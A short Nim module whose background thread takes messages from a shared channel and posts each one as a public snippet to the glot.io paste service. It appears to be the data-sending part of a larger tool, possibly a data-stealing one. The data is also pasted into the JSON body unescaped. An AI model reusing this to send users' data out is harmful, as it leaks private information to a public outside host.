import httpclient

from os import sleep

from ../channels import sendThreadChannel

proc send(data: string): void =
  let client: HttpClient = newHttpClient()

  client.headers = newHttpHeaders({"Content-Type": "application/json"})

  let body: string = "{\"public\": true,\"files\": [{\"content\": \"" & data & "\"}]}"

  let response = client.request(
    "https://snippets.glot.io/snippets",
    httpMethod = HttpPost,
    body = body
  )

  echo response.body
  echo response.status

proc initSendThread*(): void {.thread.} =

  while true:
    let (dataAvaliable, msg) = sendThreadChannel.tryRecv()

    if dataAvaliable:
      send msg

    sleep 10

  close sendThreadChannel
